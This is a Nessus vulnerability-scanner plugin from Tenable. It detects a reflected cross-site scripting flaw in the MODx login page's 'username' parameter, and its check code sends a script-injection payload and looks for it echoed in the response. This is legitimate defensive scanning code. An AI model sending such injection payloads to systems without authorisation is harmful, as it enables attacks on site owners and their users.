#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(51090);
  script_version("1.13");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");
  script_bugtraq_id(45215);
  script_xref(name:"EDB-ID", value:"15701");
  script_xref(name:"SECUNIA", value:"42483");

  script_name(english:"MODx login.php 'username' Parameter XSS");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an application that is prone to a cross-
site scripting attack.");
  script_set_attribute(attribute:"description", value:
"The installed version of MODx fails to adequately sanitize input
passed to the 'username' parameter in the 'login.php' script before
using it to generate dynamic HTML content.

An unauthenticated, remote attacker may be able to leverage this issue
to inject arbitrary HTML or script code into a user's browser to be
executed within the security context of the affected site.

Although Nessus has not checked for it, the installed version is also
likely to be affected by another cross-site scripting vulnerability
involving the 'email' parameter.");
  script_set_attribute(attribute:"see_also", value:"https://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4982.php");
  script_set_attribute(attribute:"see_also", value:"http://bugs.modx.com/issues/2918");
  script_set_attribute(attribute:"solution", value:
"Upgrade to 2.0.5-pl or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/12/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/12/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/12/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:modxcms:modxcms");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2022 Tenable Network Security, Inc.");

  script_dependencies("modx_detect.nasl");
  script_require_keys("www/modx");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'modx', port:port, exit_on_fail:TRUE);
dir = install['dir'];

# Try to exploit the issue.
xss = '"'+'><script>alert(' + "'" + SCRIPT_NAME + "'" + ')</script>';
exploit = 'username='+xss+'&password=foo';

res = http_send_recv3(
  method:"POST",
  item:dir + '/manager',
  port:port,
  follow_redirect:1,
  exit_on_fail:TRUE,
  content_type:"application/x-www-form-urlencoded",
  data:exploit
);

if (
  'id="modx-login-username" name="username"' >< res[2] &&
  'value="'+xss >< res[2]
)
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if (report_verbosity > 0)
  {
    req = http_last_sent_request();
    report = '\n' +
      'Nessus was able to verify this issue using the following request :\n' +
      '\n' +
      str_replace(find:'\n', replace:'\n  ', string:req);
    security_warning(port:port,extra:report) ;
  }
  else security_warning(port);
}
else exit(0, 'The MODx install at '+  build_url(qs:install['dir'] , port:port) + ' is not affected.');
